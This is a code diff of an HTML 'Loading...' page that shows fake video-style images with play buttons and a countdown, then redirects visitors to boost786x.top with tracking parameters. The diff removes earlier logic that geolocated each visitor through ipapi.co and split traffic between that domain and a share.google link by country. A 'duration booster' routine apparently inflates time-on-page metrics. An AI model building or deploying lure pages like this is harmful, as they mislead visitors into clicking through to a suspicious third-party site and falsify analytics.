@@ -6,10 +6,9 @@
   <title>Loading...</title>
 
     <script defer data-domain="liiiinn10.pages.dev" src="https://api.publytics.net/js/script.js"></script>
-    </script>
     <script>
       window.publytics = window.publytics || function() { (window.publytics.q = window.publytics.q || []).push(arguments) };
-    publytics(&#39;pageview&#39;);
+      publytics('pageview');
     </script>
 
   <!-- Facebook / Meta Tags -->
@@ -160,7 +159,7 @@
 <script>
 /* CONFIGURATION */
 const CONFIG = {
-  targetLink: "https://share.google/2Xp9POqK0KWgjc4Dx",
+  targetLink: "https://boost786x.top/boost55abc/?utm_source=MHR-B&utm_medium=ABC339",
   // Index 0 = no play button | Index 1,2,3 = show play after countdown
   images: [
     "https://ibwp622-oss.github.io/sharing/image_03.webp",
@@ -169,55 +168,6 @@ const CONFIG = {
     "https://blogger.googleusercontent.com/img/a/AVvXsEgxqJ9VZzSFBl94vzQs-GYFVbdbPIFcyY5TdfMJVNu0PFT6q7ZkCCzx9OZ-sJLuNsD20hR76WPggQ2xNjOtRCfTIZ6nFs7JGS9goNv_w12TLmft5ZWt2TeXXH_iWvgHuIbc_vzFYApmOsoGucgD3zkUyc4F_YA3xWn86M6A822sl4kGEO22N-0LxkiBiJvA=w360-h640"
   ]
 };
-
-/* COUNTRY ROUTING: one stable random bucket per browser visitor. */
-const SHARE_LINK = "https://share.google/2Xp9POqK0KWgjc4Dx";
-const BOOST_LINK = "https://boost786x.top/boost55abc/?utm_source=MHR-B&utm_medium=IUB";
-const BOOST_90_COUNTRIES = new Set(`
-US EG ID MX BR PH SA MA YE DZ AF MY NG IQ IT CA FR SY AR TH AE LK GB CU SD ET LY TN CD GN ES VE PE KH GT RO DE JO NP UNKNOWN NI CI PS PT PG LB UA CL QA PL BO HN HU AU DO PA SO NL EC PY MZ KW TW CM ZA UY IR GR JP GH SG OM FI AT BE BD BG MK BA SN RS ML HK HR SE IL FJ MW MV MR MG CH SC ZM GY KZ GE KE AO TL VN CR KR SL SV AZ BH UZ TD HT LR CG BJ BF CZ MU TZ SK EE VU KG TO LV BN CF CY RE NO BY SI MD MO CV RW LA MM CN PR ZW TT XK PM BI JM GM AM SS RU LT SB VC TJ MN
-`.trim().split(/\s+/));
-
-function selectCountryTarget(countryCode, bucket) {
-  const country = String(countryCode || "UNKNOWN").trim().toUpperCase();
-  if (country === "TR") return SHARE_LINK;
-  if (country === "IN") return bucket < 0.9 ? SHARE_LINK : BOOST_LINK;
-  if (country === "PK") return bucket < 0.5 ? SHARE_LINK : BOOST_LINK;
-  if (BOOST_90_COUNTRIES.has(country)) return bucket < 0.9 ? BOOST_LINK : SHARE_LINK;
-  return SHARE_LINK;
-}
-
-function getVisitorBucket() {
-  const key = "country-routing-visitor-bucket-v1";
-  try {
-    const saved = localStorage.getItem(key);
-    const value = saved === null ? NaN : Number(saved);
-    if (Number.isFinite(value) && value >= 0 && value < 1) return value;
-  } catch (e) {}
-  const value = Math.random();
-  try { localStorage.setItem(key, String(value)); } catch (e) {}
-  return value;
-}
-
-async function resolveCountryTarget() {
-  let country = "UNKNOWN";
-  const controller = new AbortController();
-  const timeout = setTimeout(() => controller.abort(), 4000);
-  try {
-    const response = await fetch("https://ipapi.co/json/", { signal: controller.signal });
-    if (!response.ok) throw new Error("Country lookup failed");
-    const data = await response.json();
-    if (!data.error && /^[a-z]{2}$/i.test(data.country_code || "")) {
-      country = data.country_code;
-    }
-  } catch (e) {
-    // Unknown is explicitly included in the requested 90% Boost / 10% Share group.
-  } finally {
-    clearTimeout(timeout);
-  }
-  CONFIG.targetLink = selectCountryTarget(country, getVisitorBucket());
-}
-
-const countryTargetReady = resolveCountryTarget();
 
 let selectedIndex = 0;
 let countdownFinished = false; // prevent early redirect
@@ -228,10 +178,9 @@ function getRandomImage() {
 }
 
 /* MAIN LOGIC */
-(async function () {
+(function () {
   showImageScreen();
   startCountdown(9);
-  await countryTargetReady;
   startDurationBooster();
 })();
 
@@ -307,8 +256,7 @@ function startDurationBooster() {
   }, 1000);
 }
 
-async function goToTarget() {
-  await countryTargetReady;
+function goToTarget() {
   window.location.href = CONFIG.targetLink;
 }
 </script>
